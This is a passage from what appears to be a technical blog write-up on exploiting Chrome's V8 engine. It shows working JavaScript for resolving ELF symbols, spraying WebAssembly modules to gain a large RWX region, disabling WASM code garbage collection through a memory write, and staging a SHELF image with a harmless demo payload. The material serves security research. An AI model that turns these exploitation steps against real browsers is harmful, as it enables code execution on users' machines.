</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nx">DT_RELAENT</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">relaent</span> <span class="o">=</span> <span class="nx">d_val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nx">DT_RELA</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">rel</span> <span class="o">=</span> <span class="nx">d_val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nx">DT_RELASZ</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">relasz</span> <span class="o">=</span> <span class="nx">d_val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">centinel</span><span class="p">,</span> <span class="nx">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">sym_type</span> <span class="o">==</span> <span class="nx">R_X86_64_GLOB_DAT</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">centinel</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">rel</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">size</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">relasz</span><span class="o">/</span><span class="k">this</span><span class="p">.</span><span class="nx">relaent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">centinel</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">jmprel</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">size</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">pltrelsz</span><span class="o">/</span><span class="k">this</span><span class="p">.</span><span class="nx">relaent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">n</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">size</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">rela_offset</span> <span class="o">=</span>  <span class="nx">centinel</span> <span class="o">+</span> <span class="p">(</span><span class="nx">sizeof_Elf64_Rela</span> <span class="o">*</span> <span class="nx">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">r_type</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">read</span><span class="p">(</span><span class="nx">rela_offset</span> <span class="o">+</span> <span class="nx">offsetof_r_info</span> <span class="o">+</span> <span class="mi">0</span><span class="nx">n</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">r_sym</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">read</span><span class="p">(</span><span class="nx">rela_offset</span> <span class="o">+</span> <span class="nx">offsetof_r_info</span> <span class="o">+</span> <span class="mi">4</span><span class="nx">n</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">sym_address</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">r_type</span> <span class="o">==</span> <span class="nx">sym_type</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">sym_offset</span> <span class="o">=</span>  <span class="k">this</span><span class="p">.</span><span class="nx">symtab</span> <span class="o">+</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">r_sym</span><span class="p">)</span> <span class="o">*</span> <span class="nx">sizeof_Elf64_Sym</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">sym_offset</span> <span class="o">==</span> <span class="mi">0</span><span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">st_name</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">read</span><span class="p">(</span><span class="nx">sym_offset</span> <span class="o">+</span> <span class="nx">offsetof_st_name</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">st_name</span> <span class="o">==</span> <span class="mi">0</span><span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">sym_type</span> <span class="o">==</span> <span class="nx">R_X86_64_GLOB_DAT</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">sym_address</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">base_addr</span> <span class="o">+</span> <span class="nx">BigInt</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">read</span><span class="p">(</span><span class="nx">sym_offset</span> <span class="o">+</span> <span class="nx">offsetof_st_value</span><span class="p">,</span> <span class="mi">4</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">sym_address</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">pltgot</span> <span class="o">+</span> <span class="p">(</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">3</span><span class="nx">n</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">st_name</span> <span class="o">===</span> <span class="mi">0</span><span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">sym_str_addr</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">strtab</span> <span class="o">+</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">st_name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">sym_str</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="kr">char</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kr">char</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">read</span><span class="p">(</span><span class="nx">sym_str_addr</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="kr">char</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">sym_str</span> <span class="o">+=</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="kr">char</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nx">sym_str_addr</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">sym_name</span> <span class="o">==</span> <span class="nx">sym_str</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">sym_address</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><br />
<hr>
<h2 id="achieving-a-stable-large-rwx-region">Achieving a stable large RWX region</h2>
<p>Once we have leaked the location of all the memory regions we need, we now have to somehow allocate a big enough memory region that is both writable and executable.</p>
<p>There are various techniques to achieve this. As documented by Brendon Tiszka, there is a possibility to disable <code>W^X</code>, a protection that was enabled on JIT memory that prevents it from being both writable and executable.</p>
<p>There is also the possibility to encode our payload as float variables in a JITed function to neglect the need of a writable region.</p>
<p>However, as of today WASM memory pages are <code>RWX</code>, therefore that&rsquo;s what we will be using for convenience.</p>
<p>I noticed that even if I created several WASM instances, only one <code>RWX</code> page was allocated, meaning that each Wasm instance or module does not get a dedicated <code>RWX</code> page. However, if we spray WASM modules we will eventually force v8 to enlarge our RWX region.</p>
<p>We can do this as follows:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// forcing V8 to generate a continuous RWX memory region of 0x801000 bytes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x10000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Instance</span><span class="p">(</span><span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Module</span><span class="p">(</span><span class="nx">wasm_code</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// retrieving start address of RWX region
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">let</span> <span class="nx">wasm_mod</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Module</span><span class="p">(</span><span class="nx">wasm_code</span><span class="p">);</span>            
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">wasm_instance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Instance</span><span class="p">(</span><span class="nx">wasm_mod</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">wasm_entry</span> <span class="o">=</span> <span class="nx">wasm_instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">main</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">wasm_instance_addr</span> <span class="o">=</span> <span class="nx">stable_addrof</span><span class="p">(</span><span class="nx">wasm_instance</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">wasm_instance_addr</span> <span class="o">=</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">wasm_instance_addr</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x68</span><span class="nx">n</span> <span class="o">-</span><span class="mi">1</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">rwx_page_addr</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">heap_accesor</span><span class="p">.</span><span class="nx">getBigUint64</span><span class="p">(</span><span class="nb">Number</span><span class="p">(</span><span class="nx">wasm_instance_addr</span><span class="p">),</span> <span class="kc">true</span><span class="p">));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>If we check RWX regions in GDB we will see the following:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">vmmap</span> <span class="o">-</span><span class="n">x</span> <span class="o">-</span><span class="n">w</span>
</span></span><span class="line"><span class="cl"><span class="nl">LEGEND</span><span class="p">:</span> <span class="n">STACK</span> <span class="o">|</span> <span class="n">HEAP</span> <span class="o">|</span> <span class="n">CODE</span> <span class="o">|</span> <span class="n">DATA</span> <span class="o">|</span> <span class="n">RWX</span> <span class="o">|</span> <span class="n">RODATA</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x38f0a69f2000</span>     <span class="mh">0x38f0a71f3000</span> <span class="n">rwxp</span>   <span class="mi">801000</span> <span class="mi">0</span>      <span class="p">[</span><span class="n">anon_38f0a69f2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>However, since we want to keep the integrity of our large RWX region, we also need to handle <a href="https://docs.google.com/document/d/14ZId5XdETWgQHJe4Jozi-aKwCwqvDLgLuokP0gnJq6Q/edit">V8&rsquo;s WASM code GC</a>.</p>
<p>Fortunately for us, there is a flag to enable or disable this feature. This flag is <code>v8::internal::FLAG_wasm_code_gc</code>. We can see it reference under <a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/wasm-engine.cc;l=1427;drc=26887614d543aaa2b9f0a7ca240a8fc631f3ede9?q=FLAG_wasm_code_gc&amp;sq=&amp;ss=chromium%2Fchromium%2Fsrc">WasmEngine::AddPotentiallyDeadCode</a>, and if enabled it will eventually trigger a GC.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">FLAG_wasm_code_gc</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Trigger a GC if 64kB plus 10% of committed code are potentially dead.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">size_t</span> <span class="n">dead_code_limit</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">    <span class="n">FLAG_stress_wasm_code_gc</span>
</span></span><span class="line"><span class="cl">        <span class="o">?</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="o">:</span> <span class="mi">64</span> <span class="o">*</span> <span class="n">KB</span> <span class="o">+</span> <span class="n">GetWasmCodeManager</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">committed_code_space</span><span class="p">()</span> <span class="o">/</span> <span class="mi">10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">new_potentially_dead_code_size_</span> <span class="o">&gt;</span> <span class="n">dead_code_limit</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">bool</span> <span class="n">inc_gc_count</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">      <span class="n">info</span><span class="o">-&gt;</span><span class="n">num_code_gcs_triggered</span> <span class="o">&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">numeric_limits</span><span class="o">&lt;</span><span class="kt">int8_t</span><span class="o">&gt;::</span><span class="n">max</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">current_gc_info_</span> <span class="o">==</span> <span class="k">nullptr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">inc_gc_count</span><span class="p">)</span> <span class="o">++</span><span class="n">info</span><span class="o">-&gt;</span><span class="n">num_code_gcs_triggered</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">TRACE_CODE_GC</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;Triggering GC (potentially dead: %zu bytes; limit: %zu bytes).</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">new_potentially_dead_code_size_</span><span class="p">,</span> <span class="n">dead_code_limit</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">TriggerGC</span><span class="p">(</span><span class="n">info</span><span class="o">-&gt;</span><span class="n">num_code_gcs_triggered</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Thankfully for us this flag is fetched dynamically by the WasmEngine on compilation of WASM module code. Therefore, we can disable this feature on runtime by overwriting the appropiate offset in Chrome:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// disabling garbage collection of wasm code
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">chrome_accesor</span><span class="p">.</span><span class="nx">setBigUint64</span><span class="p">(</span><span class="nx">kWasmCodeGC</span><span class="p">,</span> <span class="mi">0</span><span class="nx">n</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><br />
<hr>
<h2 id="preparing-a-shelf-image">Preparing a SHELF image</h2>
<p>In order to prepare our SHELF executable image, first we have to create a SHELF standalone instance. If you are interested about the internals of this process, you can check our article from <a href="https://tmpout.sh/1/10/">tmp.0ut vol 1</a>.</p>
<p>The test C code we will be deploying is the following:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">k</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">double</span> <span class="nf">sin</span><span class="p">()</span> <span class="p">,</span><span class="nf">cos</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="kt">float</span> <span class="n">A</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">B</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">z</span><span class="p">[</span><span class="mi">1760</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">b</span><span class="p">[</span><span class="mi">1760</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">arr</span><span class="p">[</span><span class="mi">6</span><span class="p">][</span><span class="mi">75</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34; ________  _________ _____ _   _ _\
</span></span></span><span class="line"><span class="cl"><span class="s">____   _   _       _   _____ &#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;|_   _|  </span><span class="se">\\</span><span class="s">/  || ___ </span><span class="se">\\</span><span class="s">  _  | | | \
</span></span></span><span class="line"><span class="cl"><span class="s">|_   _| | | | |     | | / __  </span><span class="se">\\</span><span class="s">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;  | | | .  . || |_/ / | | | | | | \
</span></span></span><span class="line"><span class="cl"><span class="s">| |   | | | | ___ | | `&#39; / /&#39;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;  | | | |</span><span class="se">\\</span><span class="s">/| ||  __/| | | | | | |\
</span></span></span><span class="line"><span class="cl"><span class="s"> | |   | | | |/ _ </span><span class="se">\\</span><span class="s">| |   / /  &#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;  | | | |  | || |_  </span><span class="se">\\</span><span class="s"> </span><span class="se">\\</span><span class="s">_/ / |_| \
</span></span></span><span class="line"><span class="cl"><span class="s">| | |   </span><span class="se">\\</span><span class="s"> </span><span class="se">\\</span><span class="s">_/ / (_) | | ./ /___&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;  </span><span class="se">\\</span><span class="s">_/ </span><span class="se">\\</span><span class="s">_|  |_/</span><span class="se">\\</span><span class="s">_(_)  </span><span class="se">\\</span><span class="s">___/ </span><span class="se">\\</span><span class="s">_\
</span></span></span><span class="line"><span class="cl"><span class="s">__/  </span><span class="se">\\</span><span class="s">_/    </span><span class="se">\\</span><span class="s">___/ </span><span class="se">\\</span><span class="s">___/|_| </span><span class="se">\\</span><span class="s">_____/&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// unobfuscated version of donut.c by Andy Sloane
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// https://www.a1k0n.net/2006/09/15/obfuscated-c-donut.html)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x1b</span><span class="s">[2J&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span> <span class="p">;</span> <span class="p">;</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">memset</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">1760</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">memset</span><span class="p">(</span><span class="n">z</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">7040</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="mf">6.28</span> <span class="o">&gt;</span> <span class="n">j</span><span class="p">;</span> <span class="n">j</span> <span class="o">+=</span> <span class="mf">0.07</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="mf">6.28</span> <span class="o">&gt;</span> <span class="n">i</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mf">0.02</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="kt">float</span> <span class="n">sini</span> <span class="o">=</span> <span class="nf">sin</span><span class="p">(</span><span class="n">i</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                      <span class="n">cosj</span> <span class="o">=</span> <span class="nf">cos</span><span class="p">(</span><span class="n">j</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                      <span class="n">sinA</span> <span class="o">=</span> <span class="nf">sin</span><span class="p">(</span><span class="n">A</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                      <span class="n">sinj</span> <span class="o">=</span> <span class="nf">sin</span><span class="p">(</span><span class="n">j</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                      <span class="n">cosA</span> <span class="o">=</span> <span class="nf">cos</span><span class="p">(</span><span class="n">A</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                      <span class="n">cosj2</span> <span class="o">=</span> <span class="n">cosj</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                      <span class="n">mess</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">/</span> <span class="p">(</span><span class="n">sini</span> <span class="o">*</span> <span class="n">cosj2</span> <span class="o">*</span> <span class="n">sinA</span> <span class="o">+</span> <span class="n">sinj</span> <span class="o">*</span> <span class="n">cosA</span> <span class="o">+</span> <span class="mi">5</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                      <span class="n">cosi</span> <span class="o">=</span> <span class="nf">cos</span><span class="p">(</span><span class="n">i</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                      <span class="n">cosB</span> <span class="o">=</span> <span class="nf">cos</span><span class="p">(</span><span class="n">B</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                      <span class="n">sinB</span> <span class="o">=</span> <span class="nf">sin</span><span class="p">(</span><span class="n">B</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                      <span class="n">t</span> <span class="o">=</span> <span class="n">sini</span> <span class="o">*</span> <span class="n">cosj2</span> <span class="o">*</span> <span class="n">cosA</span> <span class="o">-</span> <span class="n">sinj</span> <span class="o">*</span> <span class="n">sinA</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">40</span> <span class="o">+</span> <span class="mi">30</span> <span class="o">*</span> <span class="n">mess</span> <span class="o">*</span> <span class="p">(</span><span class="n">cosi</span> <span class="o">*</span> <span class="n">cosj2</span> <span class="o">*</span> <span class="n">cosB</span> <span class="o">-</span><span class="n">t</span> <span class="o">*</span> <span class="n">sinB</span><span class="p">),</span>
